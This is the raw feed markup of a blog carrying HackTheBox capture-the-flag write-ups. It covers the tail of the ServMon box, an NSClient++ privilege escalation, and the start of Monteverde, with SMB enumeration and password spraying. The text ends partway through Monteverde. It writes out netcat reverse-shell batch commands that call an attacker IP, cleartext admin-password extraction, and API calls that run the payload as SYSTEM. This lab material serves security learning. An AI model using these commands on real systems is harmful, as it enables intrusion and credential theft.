C:\Users\Nadine&gt;type Desktop\user.txt</span></span><br><span class="line"><span class="string">6xxxxxxxxxxxxxxxxxxxxxxxe</span></span><br></pre></td></tr></table></figure><h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>So far we didn’t even need to look at what’s is running on port <code>8443</code>. Since nothing is left at random on HackTheBox that’s probably our entry point to root.</p><p>Opening <a href="http://servom.htb:8443/">http://servom.htb:8443</a> display a following page: </p><img width="1036" alt="Screenshot 2020-05-25 at 11 37 32" src="https://user-images.githubusercontent.com/9076747/82800515-227d6d00-9e7c-11ea-8553-a66ebdbe826e.png"><p>The web interface is really buggy and nothing can be done from there. I don’t know if it’s intended or not but anyway let’s move on.</p><p>Out of curiosity let’s check on <code>searchsploit</code> if any vulnerabilities are available for this <code>NSClient++</code> tool:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit nsclient</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">                                                           | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line">NSClient++ 0.5.2.35 - Authenticated Remote Code Execution  | exploits/json/webapps/48360.txt</span><br><span class="line">NSClient++ 0.5.2.35 - Privilege Escalation                 | exploits/windows/<span class="built_in">local</span>/46802.txt</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>Navigating to the <code>NSPClient++</code> folder allows to confirm the version running is vulnerable:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files\NSClient++&gt; .\nscp -<span class="literal">-version</span></span><br><span class="line">NSClient++, Version: <span class="number">0.5</span>.<span class="number">2.35</span> <span class="number">2018</span><span class="literal">-01</span><span class="literal">-28</span>, Platform: x64</span><br></pre></td></tr></table></figure><p>We are going to skip the <code>Authenticated Remote Code Execution</code> since, well, we already have code execution on the machine as <code>Nadine</code>.<br>But the <code>Privilege Escalation </code> looks exactly what we need to get to <code>root</code>. Let’s take a look at it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat /usr/share/exploitdb/exploits/windows/<span class="built_in">local</span>/46802.txt</span><br><span class="line">Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">When NSClient++ is installed with Web Server enabled, <span class="built_in">local</span> low privilege users have the ability to <span class="built_in">read</span> the web administator<span class="string">&#x27;s password in cleartext from the configuration file. From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn&#x27;</span>t seem to be restrictions on <span class="built_in">where</span> the scripts are called from, so the user can create the script anywhere. Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  </span><br><span class="line"></span><br><span class="line">Exploit:</span><br><span class="line">1. Grab web administrator password</span><br><span class="line">- run the following that is instructed when you select forget password</span><br><span class="line">        C:\Program Files\NSClient++&gt;nscp web -- password --display</span><br><span class="line">        Current password: SoSecret</span><br><span class="line"></span><br><span class="line">2. Login and <span class="built_in">enable</span> following modules including <span class="built_in">enable</span> at startup and save configuration</span><br><span class="line">- CheckExternalScripts</span><br><span class="line">- Scheduler</span><br><span class="line"></span><br><span class="line">3. Download nc.exe and evil.bat to c:\temp from attacking machine</span><br><span class="line">        @<span class="built_in">echo</span> off</span><br><span class="line">        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe</span><br><span class="line"></span><br><span class="line">4. Setup listener on attacking machine</span><br><span class="line">        nc -nlvvp 443</span><br><span class="line"></span><br><span class="line">5. Add script foobar to call evil.bat and save settings</span><br><span class="line">- Settings &gt; External Scripts &gt; Scripts</span><br><span class="line">- Add New</span><br><span class="line">        - foobar</span><br><span class="line">                <span class="built_in">command</span> = c:\temp\evil.bat</span><br><span class="line"></span><br><span class="line">6. Add schedulede to call script every 1 minute and save settings</span><br><span class="line">- Settings &gt; Scheduler &gt; Schedules</span><br><span class="line">- Add new</span><br><span class="line">        - foobar</span><br><span class="line">                interval = 1m</span><br><span class="line">                <span class="built_in">command</span> = foobar</span><br></pre></td></tr></table></figure><p>Sounds really good, we have the detailed exploit procedure. One problem remains, most of the configuration needed in order to setup the exploit require access to the Web Interface. Unfortunately this interface is <em>completely</em> buggy and unstable (at least when I was working on it), so we need to find a way to access the same feature but without using the Web Interface.</p><p>After reading the documentation a little I am confident it should be possible to do so only using the API and the <code>nscp</code> client.<br>Alright let’s get into it!</p><h3 id="NSPClient-Privilege-Escalation"><a href="#NSPClient-Privilege-Escalation" class="headerlink" title="NSPClient++ Privilege Escalation"></a>NSPClient++ Privilege Escalation</h3><p>First we need to retrieve the admin account password. Let’s use <code>nspd</code> client to do so:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files\NSClient++&gt; .\nscp web -- password -<span class="literal">-display</span></span><br><span class="line">Current password: ew2x6SsGTxjRwXOT</span><br></pre></td></tr></table></figure><p>Then let’s activate <code>CheckExternalScripts</code> module:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files\NSClient++&gt; .\nscp settings -<span class="literal">-activate</span><span class="literal">-module</span> CheckExternalScripts</span><br><span class="line">E   schedule WE need wither duration or schedule: foobar[<span class="number">1936159329</span>] = &#123;tpl: &#123;alias: foobar, path: /s</span><br><span class="line">ettings/scheduler/schedules/foobar, is_tpl: false, parent: default, value: command = foobar, options</span><br><span class="line">: &#123; &#125; &#125;, command: command, channel: NSCA, source_id: , target_id: &#125;</span><br></pre></td></tr></table></figure><p>Now let’s download a Windows version of <code>netcat</code> and create our <code>.bat</code> reverse-shell script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe</span><br><span class="line">[hg8@archbook ~]$ cat hg8.bat</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">C:\Temp\nc.exe 10.10.10.10 8585 -e cmd.exe</span><br></pre></td></tr></table></figure><p>Using a <code>scp</code> we can send <code>nc.exe</code> to the box <code>C:\Temp</code> folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp nc.exe Nadine@servmon.htb:C:/Temp</span><br><span class="line">Nadine@servmon.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">nc.exe                          100%   38KB 442.0KB/s   00:00</span></span><br></pre></td></tr></table></figure><p>Let’s make sure it’s been sent correctly:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files\NSClient++&gt; <span class="built_in">ls</span> C:\Temp</span><br><span class="line"></span><br><span class="line">    Directory: C:\Temp</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line"><span class="literal">-a</span>----       <span class="number">26</span>/<span class="number">05</span>/<span class="number">2020</span>     <span class="number">13</span>:<span class="number">46</span>          <span class="number">38616</span> nc.exe</span><br></pre></td></tr></table></figure><p>Alright, we have everything ready now. Let’s use <code>NSClient++</code> to execute our reverse shell with elevated privileges. To do so we need to add an “External Script” and then tell <code>NSClient++</code> to execute it. </p><p>Since the Web Interface is not accessible we need to use the API. Thankfully it’s <em>almost</em> fully <a href="https://docs.nsclient.org/api/rest/">documented</a>.</p><p>The API is only accessible from <code>localhost</code> so I will open a SSH tunnel to make testing easier since I am more confortable working with <code>bash</code> than <code>powershell</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -L 4444:127.0.0.1:8443 nadine@10.10.10.184</span><br></pre></td></tr></table></figure><p>Now we are all setup. Let’s add our external script (the reverse shell) using the API:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:4444/api/v1/scripts/ext/scripts/hg8.bat --data-binary @hg8.bat</span><br><span class="line">Added hg8 as scripts\hg8.bat% </span><br></pre></td></tr></table></figure><p>We can verify our script have been added:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -k -u admin:ew2x6SsGTxjRwXOT https://localhost:4444/api/v1/scripts/ext</span><br><span class="line">[<span class="string">&quot;hg8&quot;</span>]</span><br></pre></td></tr></table></figure><p>Time to open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And use the API again to execute our script. The execute command was not so straightforward to find from the documentation but digging a little we can find it under <a href="https://docs.nsclient.org/api/rest/queries/#command-execute"><code>queries</code> endpoint</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -k -u admin:ew2x6SsGTxjRwXOT <span class="string">&quot;https://127.0.0.1:4444/api/v1/queries/hg8/commands/execute&quot;</span></span><br></pre></td></tr></table></figure><p>And on our listener a new connection open, we have a shell as <code>nt authority\system</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.184:49746</span><br><span class="line">Microsoft Windows [Version 10.0.18363.752]</span><br><span class="line">(c) 2019 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Program Files\NSClient++&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Program Files\NSClient++&gt; <span class="built_in">type</span> C:\Users\Administrator\Desktop\root.txt</span><br><span class="line">0xxxxxxxxxxxxxxxxxxxxx5</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ftp </tag>
            
            <tag> windows </tag>
            
            <tag> crackmapexec </tag>
            
            <tag> ServMon </tag>
            
            <tag> directory traversal </tag>
            
            <tag> hydra </tag>
            
            <tag> NSPClient </tag>
            
            <tag> ssh tunnel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Monteverde</title>
      <link href="/posts/monteverde/"/>
      <url>/posts/monteverde/</url>
      
        <content type="html"><![CDATA[<img width="583" alt="monteverde-hackthebox" src="https://user-images.githubusercontent.com/9076747/82916148-f217fa80-9f71-11ea-86cf-2c867c5c1463.png"><p>Monteverde just retired on Hackthebox, it’s a medium difficulty Windows box. It’s was a very interesting webless box. Still being a bit new to the Windows environment the foothold was not that easy to find for me but once you do enough recon it get pretty straightforward real life scenarios to arrive to <code>root</code>. I would recommend it if you are confortable on easy box and want to level up to a medium one.</p><p><strong>Tl;Dr:</strong> To get the user flag you had to enumerate users using RPC service, using password spraying you find that user use its own username as password allowing to connect to its SMB folder. In this folder we found an Azure configuration file containing credentials for user <code>mhope</code>. Then using <code>WinRM</code> protocol we can connect to <code>mhope</code> account and grab the flag.<br>To get the root flag you had to exploit an “Azure Active Directory Connect Database” privilege escalation exploit in order to retrieve <code>administrator</code> credentials and get the flag. </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.172 monteverde.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ $ nmap -Pn -n -A -T5 -p1-65535 10.10.10.172</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.172</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-26 19:25:41Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 374.92 seconds</span><br></pre></td></tr></table></figure><p>As often on Windows machines we do have a lot of ports open. It’s one of the first box I see without any web server running nor SSH open. It’s going to be fun :) </p><h3 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h3><p>From the <code>nmap</code> result and being one of my first Windows based box I was really unsure where to start off so I decided to give a try to <code>enum4linux</code>.</p><blockquote><p>Enum4linux is a tool for enumerating information from Windows and  Samba systems.</p><p>It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p><p><a href="https://labs.portcullis.co.uk/tools/enum4linux/">https://labs.portcullis.co.uk/tools/enum4linux/</a></p></blockquote><p>Hopefully this can give us better idea of what is running on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ enum4linux 10.10.10.172 2&gt;/dev/null</span><br><span class="line">Starting enum4linux v0.8.9 </span><br><span class="line"></span><br><span class="line"> ==========================</span><br><span class="line">|    Target Information    |</span><br><span class="line"> ==========================</span><br><span class="line">Target ........... 10.10.10.172</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"> ===========================================</span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 10.10.10.172    |</span><br><span class="line"> ===========================================</span><br><span class="line">Domain Name: MEGABANK</span><br><span class="line">Domain Sid: S-1-5-21-391775091-850290835-3566037492</span><br><span class="line">[+] Host is part of a domain (not a workgroup)</span><br><span class="line"></span><br><span class="line"> =============================</span><br><span class="line">|    Users on 10.10.10.172    |</span><br><span class="line"> =============================</span><br><span class="line"></span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[AAD_987d7f2f57d2] rid:[0x450]</span><br><span class="line">user:[mhope] rid:[0x641]</span><br><span class="line">user:[SABatchJobs] rid:[0xa2a]</span><br><span class="line">user:[svc-ata] rid:[0xa2b]</span><br><span class="line">user:[svc-bexec] rid:[0xa2c]</span><br><span class="line">user:[svc-netapp] rid:[0xa2d]</span><br><span class="line">user:[dgalanos] rid:[0xa35]</span><br><span class="line">user:[roleary] rid:[0xa36]</span><br><span class="line">user:[smorgan] rid:[0xa37]</span><br><span class="line"></span><br><span class="line"> =========================================</span><br><span class="line">|    Share Enumeration on 10.10.10.172    |</span><br><span class="line"> =========================================</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 445/SMB...</span><br><span class="line"></span><br><span class="line">[+] Found domain(s):</span><br><span class="line"></span><br><span class="line">        [+] MEGABANK</span><br><span class="line">        [+] Builtin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with rpcclient:</span><br><span class="line">Password Complexity: Disabled</span><br><span class="line">Minimum Password Length: 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==============================</span><br><span class="line">|    Groups on 10.10.10.172    |</span><br><span class="line"> ==============================</span><br><span class="line"></span><br><span class="line">[+] Getting domain group memberships:</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\Administrator</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\krbtgt</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\mhope</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\SABatchJobs</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\svc-ata</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\svc-bexec</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\svc-netapp</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\dgalanos</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\roleary</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\smorgan</span><br><span class="line">Group <span class="string">&#x27;Azure Admins&#x27;</span> (RID: 2601) has member: MEGABANK\Administrator</span><br><span class="line">Group <span class="string">&#x27;Azure Admins&#x27;</span> (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2</span><br><span class="line">Group <span class="string">&#x27;Azure Admins&#x27;</span> (RID: 2601) has member: MEGABANK\mhope</span><br><span class="line">Group <span class="string">&#x27;HelpDesk&#x27;</span> (RID: 2611) has member: MEGABANK\roleary</span><br><span class="line">Group <span class="string">&#x27;Domain Guests&#x27;</span> (RID: 514) has member: MEGABANK\Guest</span><br><span class="line">Group <span class="string">&#x27;Trading&#x27;</span> (RID: 2610) has member: MEGABANK\dgalanos</span><br><span class="line">Group <span class="string">&#x27;Operations&#x27;</span> (RID: 2609) has member: MEGABANK\smorgan</span><br><span class="line">Group <span class="string">&#x27;Group Policy Creator Owners&#x27;</span> (RID: 520) has member: MEGABANK\Administrator</span><br><span class="line"></span><br><span class="line">enum4linux complete</span><br></pre></td></tr></table></figure><p>The full result of <code>Enum4Linux</code> is very complete so I removed the informations we don’t need. </p><p>One thing that catch the eye is that <code>Password Complexity</code> is set to <code>disabled</code>. Since we have a list of user we can maybe find one account using a weak password by brute-force.</p><h3 id="Brute-force-user-accounts"><a href="#Brute-force-user-accounts" class="headerlink" title="Brute-force user accounts"></a>Brute-force user accounts</h3><p>Since the SMB port <code>445</code> is open we can use it to try bruteforcing account passwords. To do so I will use <a href="https://github.com/byt3bl33d3r/CrackMapExec"><code>crackmapexec</code></a>. </p><p>After having no luck with the classical <code>rockyou.txt</code> password list I decided to take a different approach. One common weak password strategy is the reuse of username as password, either when setting up a default account or out of user laziness. Maybe one of the users did so ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE</span><br><span class="line">[...]</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs</span><br></pre></td></tr></table></figure><p>Bingo! We got <code>SABatchJobs</code> SMB credentials.</p><h3 id="SABatchJobs-Shared-Folder"><a href="#SABatchJobs-Shared-Folder" class="headerlink" title="SABatchJobs Shared Folder"></a>SABatchJobs Shared Folder</h3><p>Now that we have <code>SABatchJobs</code> credentials let’s see if we can find anything in its SMB shared folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ smbclient -U <span class="string">&#x27;SABatchJobs&#x27;</span> //10.10.10.172/users$</span><br><span class="line">Enter MYGROUP\SABatchJobs<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Jan  3 14:12:48 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Jan  3 14:12:48 2020</span></span><br><span class="line"><span class="string">  dgalanos                            D        0  Fri Jan  3 14:12:30 2020</span></span><br><span class="line"><span class="string">  mhope                               D        0  Fri Jan  3 14:41:18 2020</span></span><br><span class="line"><span class="string">  roleary                             D        0  Fri Jan  3 14:10:30 2020</span></span><br><span class="line"><span class="string">  smorgan                             D        0  Fri Jan  3 14:10:24 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                524031 blocks of size 4096. 519955 blocks available</span></span><br></pre></td></tr></table></figure><p>We have a few users folder. <code>mhope</code> one contains what’s look like an interesting configuration file named  <code>azure.xml</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; <span class="built_in">cd</span> mhope\</span><br><span class="line">smb: \mhope\&gt; ls</span><br><span class="line">  .                                   D        0  Fri Jan  3 14:41:18 2020</span><br><span class="line">  ..                                  D        0  Fri Jan  3 14:41:18 2020</span><br><span class="line">  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020</span><br><span class="line"></span><br><span class="line">                524031 blocks of size 4096. 519955 blocks available</span><br><span class="line">smb: \mhope\&gt; get azure.xml</span><br><span class="line">getting file \mhope\azure.xml of size 1212 as azure.xml (9.0 KiloBytes/sec) (average 9.0 KiloBytes/sec)</span><br><span class="line">smb: \mhope\&gt; <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ cat azure.xml</span><br><span class="line">&lt;Objs Version=<span class="string">&quot;1.1.0.1&quot;</span> xmlns=<span class="string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;</span><br><span class="line">  &lt;Obj RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;TN RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;DT N=<span class="string">&quot;StartDate&quot;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;</span><br><span class="line">      &lt;DT N=<span class="string">&quot;EndDate&quot;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;</span><br><span class="line">      &lt;G N=<span class="string">&quot;KeyId&quot;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;</span><br><span class="line">      &lt;S 